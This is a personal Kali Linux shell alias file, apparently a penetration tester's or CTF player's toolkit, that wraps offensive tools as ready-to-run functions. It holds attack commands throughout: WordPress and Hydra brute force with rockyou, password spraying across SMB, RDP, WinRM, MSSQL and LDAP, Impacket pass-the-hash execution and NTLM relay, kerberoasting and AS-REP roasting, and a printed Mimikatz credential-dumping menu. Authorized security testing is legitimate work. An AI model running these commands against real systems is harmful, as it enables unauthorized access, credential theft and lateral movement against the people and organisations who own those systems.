#############################################
# Kali Aliases & Helpers (grepable) #
#############################################
#
# - This file is intended to be grepped by tag to quickly find useful aliases/functions.

# Conventions:
# - Tags appended in square brackets at end of line, e.g.  # [nmap scan]
# - Functions are used for commands that take arguments; simple aliases for fixed commands.

# Source per-user environment variables if present (silently)
[ -f "$HOME/.env" ] && . "$HOME/.env" 2>/dev/null

# Safe defaults (no secrets). Respect existing env if already set.
export DOMAIN="${DOMAIN:-}"
export DC="${DC:-}"
export RHOST="${RHOST:-}"
export RHOSTS="${RHOSTS:-}"
export LHOST="${LHOST:-}"
export RPORT="${RPORT:-}"
export LPORT="${LPORT:-}"
export USERNAME="${USERNAME:-}"
export PASSWORD="${PASSWORD:-}"
export NT_HASH="${NT_HASH:-${HASH:-}}"  # Accept $NT_HASH or fallback to $HASH if set


# Base path for ToolBox scripts (override by exporting $KALI before sourcing)
export KALI="${KALI:-$HOME/ToolBox}"

# Avoid alias→function parse errors in zsh (e.g., ll())
if [ -n "$ZSH_VERSION" ]; then
  unalias ll 2>/dev/null || true
fi


########## Admin / Quality of Life ##########
ll() { command ls --color -lah -- "$@"; }  # [files listing]
comparelists() { grep -Fvx -f "$2" -- "$1"; }  # [files diff compare]
store() { python3 "$KALI"/scripts/store.py "$@"; }  # [helpers]
tjp() { [ -n "$ZSH_VERSION" ] && . "$HOME/.zshrc"; [ -f "$HOME/.kali" ] && . "$HOME/.kali" && . "$HOME/.env"; }  # [shell reload]
toolbox() { cd "$TOOLBOX" || return; }  # [nav repo]
vt_scan() {python "$SRC"/Files/vt_scan/vt_scan.py --format md "$1"}
source_venv() {source ~/.venv/bin/activate} # pip 
CodeVault() {cd "$CODEVAULT" ; git add . ; git commit -m "$1" ; git push ; cd - } 
ToolBox() {cd "$TOOLBOX" ; git add . ; git commit -m "$1" ; git push ; cd -}
pybin() {python3 "$PYBIN" "$@"}

# Quick editor opener (background)
gedit() { command gedit "$@" & }  # [gui editor]
alias o='gedit ~/.kali &'
alias s='(){grep -i "$1" ~/.kali --color}'

############## Scanning / Recon ##############
# Nmap quick and full
qn() { nmap -vv --min-rate=1500 -T4 -sT -Pn "$@"; }  # [nmap scan]
fn() { nmap -vv --min-rate=1500 --open -p- -T4 -A -Pn "$@" -oN scan.md; }  # [nmap scan full]
sn() { sudo nmap -vv --open -Pn "$@" -oN scan.md; }  # [sneaky scan service]

# AutoRecon (respects external AUTORECON_CONFIG)
autorecon() { sudo -E "$(command -v autorecon)" ${AUTORECON_CONFIG:+-c "$AUTORECON_CONFIG"} "$@"; }  # [recon autorecon]
sautorecon() { sudo autorecon -t "$1" -vv --plugins-dir "$HOME/.config/AutoRecon/plugins"; }  # [recon autorecon]


##################### Web #####################
# Curl through Burp with API key header
curlburp() {
  curl --insecure -x 127.0.0.1:8080 --location "${WEB_SITE:-http://$RHOST}" \
    --header "apikey:${BURP_API_KEY:-}" -i
}  # [web burp curl]

# WPScan quick login spray against wp-login
wps() {
  wpscan --url "http://$RHOST/wp/wp-login.php" --usernames admin \
    --passwords /usr/share/wordlists/rockyou.txt --max-threads=50
}  # [web wordpress wpscan]

ferox_full(){ feroxbuster -u "$1" -x php,html,js,txt,bak,old,zip,tar,tar.gz,sql,json,xml,env,py,config,ssh -A -k -s 200,204,301,302,307 -t 10 -r -d 5 --extract-links --timeout 10 --rate-limit 0.1 --thorough -o "feroxbuster_$(echo "$1" | sed 's|https\?://||; s|/|_|g').txt"; }

##################### TLS / mTLS #####################
mtls_check_brief() {
  local target="${1:-${TARGET:-$RHOST}}" port="${2:-443}"
  openssl s_client -connect "${target}:${port}" -servername "$target" -brief -showcerts </dev/null
}  # [tls mtls check openssl]

mtls_check_trace() {
  local target="${1:-${TARGET:-$RHOST}}" port="${2:-443}"
  openssl s_client -connect "${target}:${port}" -servername "$target" -state -msg </dev/null
}  # [tls mtls trace openssl]

p12_to_pem() {
  local p12="${1:-client.p12}" cert_out="${2:-client.crt}" key_out="${3:-client.key}"
  openssl pkcs12 -in "$p12" -clcerts -nokeys -out "$cert_out"
  openssl pkcs12 -in "$p12" -nocerts -out "$key_out" -noenc
}  # [tls mtls p12 convert]

mtls_handshake() {
  local target="${1:-${TARGET:-$RHOST}}" port="${2:-443}" cert="${3:-client.crt}" key="${4:-client.key}" cafile="${5:-ca.crt}"
  openssl s_client \
    -connect "${target}:${port}" \
    -servername "$target" \
    -cert "$cert" \
    -key "$key" \
    -verifyCAfile "$cafile" \
    -verify_return_error \
    -showcerts </dev/null
}  # [tls mtls handshake openssl]


##################### OSINT ####################
# GitHub secrets scanning via Docker trufflehog
trufflehog() {
  docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github \
    --token="${GITHUB_TOKEN:-$GIT_API_TOKEN}" "$@"
}  # [osint github secrets]

# Recon-NG (docker)
drecon-ng() {
  docker run --rm -it -p 5000:5000 -v "$(pwd):/recon-ng" -v "$HOME/.recon-ng:/root/.recon-ng" \
    --entrypoint ./recon-ng recon-ng
}  # [osint recon-ng docker]

# Subfinder (docker)
subfinder() {
  docker run --rm -it -v "$PWD:/pwd" projectdiscovery/subfinder:latest "$@"
}  # [osint subdomains docker]

# Subfinder using local config dir
subfinderc() {
  docker run --rm -it -v "$CONFIG/subfinder:/root/.config/subfinder" projectdiscovery/subfinder:latest -d "$1"
}  # [osint subdomains config docker]


#################### Docker ####################
dhelp() {
  cat <<'EOF'
docker run -v /host_dir:/cont_dir -p 8080:443 -it [image] [command]
docker exec -it [containerId] [command]
docker exec -it [containerId] sh
docker run -it [imageName] sh
docker export <container> > latest.tar
EOF
}  # [docker help]

de() { sudo docker exec -it "$@"; }  # [docker exec]
dgitleaks() { sudo docker run --rm -it zricethezav/gitleaks "$@"; }  # [docker gitleaks]


############ Credentials & Wordlists ###########
addu() { printf '%s\n' "$1" >> "$HOME/Tools/db/users.txt"; }  # [creds users]
addo() { printf '%s\n' "$1" >> "$HOME/Tools/db/passwords.txt"; }  # [creds passwords]
addc() { printf '%s\n' "$1" >> "$HOME/Tools/db/creds.txt"; }  # [creds pairs]
addh() { printf '%s\n' "$1" >> "$HOME/Tools/db/hashes.txt"; }  # [creds hashes]
users() { cat "$HOME/Tools/db/users.txt"; }  # [creds users]
passwords() { cat "$HOME/Tools/db/passwords.txt"; }  # [creds passwords]
creds() { cat "$HOME/Tools/db/creds.txt"; }  # [creds pairs]
hashes() { cat "$HOME/Tools/db/hashes.txt"; }  # [creds hashes]

# NetExec/CME quick spray across multiple protocols
nxc_spray() {
  nxc smb "$1" -u "$2" -p "$3"              | tee -a nxc_spray.md
  nxc smb "$1" -u "$2" -p "$3" --local-auth | tee -a nxc_spray.md
  nxc wmi "$1" -u "$2" -p "$3"              | tee -a nxc_spray.md
  nxc wmi "$1" -u "$2" -p "$3" --local-auth | tee -a nxc_spray.md
  nxc rdp "$1" -u "$2" -p "$3"              | tee -a nxc_spray.md
  nxc rdp "$1" -u "$2" -p "$3" --local-auth | tee -a nxc_spray.md
  nxc ftp "$1" -u "$2" -p "$3"              | tee -a nxc_spray.md
  nxc ftp "$1" -u "$2" -p "$3" --local-auth | tee -a nxc_spray.md
  nxc winrm "$1" -u "$2" -p "$3"            | tee -a nxc_spray.md
  nxc winrm "$1" -u "$2" -p "$3" --local-auth | tee -a nxc_spray.md
  nxc mssql "$1" -u "$2" -p "$3"            | tee -a nxc_spray.md
  nxc mssql "$1" -u "$2" -p "$3" --local-auth | tee -a nxc_spray.md
  nxc ldap "$1" -u "$2" -p "$3"             | tee -a nxc_spray.md
  nxc ldap "$1" -u "$2" -p "$3" --local-auth | tee -a nxc_spray.md
}  # [spray auth netexec]


################### Windows / AD ###################
# Mimikatz quick menu
mimikatz_print() {
  cat <<'EOF'
.\mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords
  token::elevate
  lsadump::sam
EOF
}  # [windows mimikatz]

# Impacket helpers (use $USERNAME/$PASSWORD or $NT_HASH)
imp-psexec() { impacket-psexec -hashes "00000000000000000000000000000000:${NT_HASH}" "$USERNAME@$RHOST"; }  # [impacket psexec]
imp-wmiexec() { impacket-wmiexec -hashes "00000000000000000000000000000000:${NT_HASH}" "$USERNAME@$RHOST"; }  # [impacket wmi]
imp-ntlmrelayx() { impacket-ntlmrelayx --no-http-server -smb2support -t "$RHOST" -c "${1:-cmd.exe}"; }  # [impacket relay]
imp-mssqlclient() { impacket-mssqlclient "$USERNAME:${PASSWORD}"@"$RHOST" -windows-auth; }  # [impacket mssql]
imp-GetUserSPNs() { impacket-GetUserSPNs -request -dc-ip "$RHOST" "$DOMAIN/$USERNAME:$PASSWORD"; }  # [impacket kerberoast]

# Kerberos/AS-REP roasting (Impacket GetNPUsers)
getnpusers() {
  python3 GetNPUsers.py "$DOMAIN/" -usersfile "${1:-user.txt}" -format hashcat -outputfile "${2:-hashes.domain.txt}"
}  # [kerberos asrep roast]

# Rubeus helpers (to run on Windows target)
rubeus_kerberoast() { echo '.\Rubeus.exe kerberoast /outfile:hashes.kerberoast'; }  # [kerberos rubeus roast]
rubeus_kerberoast_user() { echo ".\Rubeus.exe kerberoast /user:${KERBEROAST_USER:-svc_account} /outfile:hashes.kerberoast"; }  # [kerberos rubeus roast]

# PowerView / SharpHound hints (print-only; set DOMAIN/creds elsewhere)
sharphound_print() {
  cat <<'EOF'
Import-Module '.\SharpHound.ps1'
Invoke-BloodHound -CollectionMethod All -OutputDirectory 'C:\\TEMP\\' -OutputPrefix audit
EOF
}  # [ad bloodhound]


# Kerbrute / CrackMapExec spraying helpers
kerbrute_passwordspray() {
  local domain="${1:-$DOMAIN}" userlist="${2:-domain_users.txt}" password="${3:-$PASSWORD}"
  local kerbrute_bin="${KERBRUTE_BIN:-./kerbrute_linux_amd64}"
  "$kerbrute_bin" passwordspray -d "$domain" "$userlist" "$password"
}  # [ad kerbrute spray]

kerbrute_userenum() {
  local domain="${1:-$DOMAIN}" userlist="${2:-usernames.txt}"
  local kerbrute_bin="${KERBRUTE_BIN:-./kerbrute_linux_amd64}"
  "$kerbrute_bin" userenum -d "$domain" "$userlist"
}  # [ad kerbrute enum]

kerbrute_users_dc() {
  local domain="${1:-$DOMAIN}" userlist="${2:-users.txt}" dc_ip="${3:-${DC:-$RHOST}}"
  local kerbrute_bin="${KERBRUTE_BIN:-./kerbrute_linux_amd64}"
  "$kerbrute_bin" -domain "$domain" -users "$userlist" -dc-ip "$dc_ip"
}  # [ad kerbrute enum dc]

cme_smb_spray() {
  local target="${1:-$RHOSTS}" users="${2:-users.txt}" password="${3:-$PASSWORD}" domain="${4:-$DOMAIN}"
  crackmapexec smb "$target" -u "$users" -p "$password" -d "$domain" --continue-on-success
}  # [ad cme smb spray]

cme_smb_shares() {
  local target="${1:-$RHOSTS}" users="${2:-users.txt}" passwords="${3:-passwords.txt}"
  crackmapexec smb "$target" -u "$users" -p "$passwords" --shares
}  # [ad cme smb shares]

cme_ldap_laps() {
  local dc="${1:-${DC:-$RHOST}}" user="${2:-$USERNAME}" password="${3:-$PASSWORD}" kdc="${4:-$dc}"
  crackmapexec ldap "$dc" -u "$user" -p "$password" --kdcHost "$kdc" -M laps
}  # [ad cme ldap laps]

cme_mssql_cmd() {
  local target="${1:-$RHOST}" domain="${2:-$DOMAIN}" user="${3:-$USERNAME}" password="${4:-$PASSWORD}" cmd="${5:-whoami}"
  crackmapexec mssql "$target" -d "$domain" -u "$user" -p "$password" -x "$cmd"
}  # [ad cme mssql exec]


################### Hydra ###################
hydra_unk() { hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt -vV "$ip" "$1"; }  # [hydra brute]
hydra_gethttp() { hydra -l admin -P /usr/share/wordlists/rockyou.txt "$ip" http-get "$1"; }  # [hydra http]
hydra_httppostform() {
  echo "hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form '/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid'"
}  # [hydra http form]

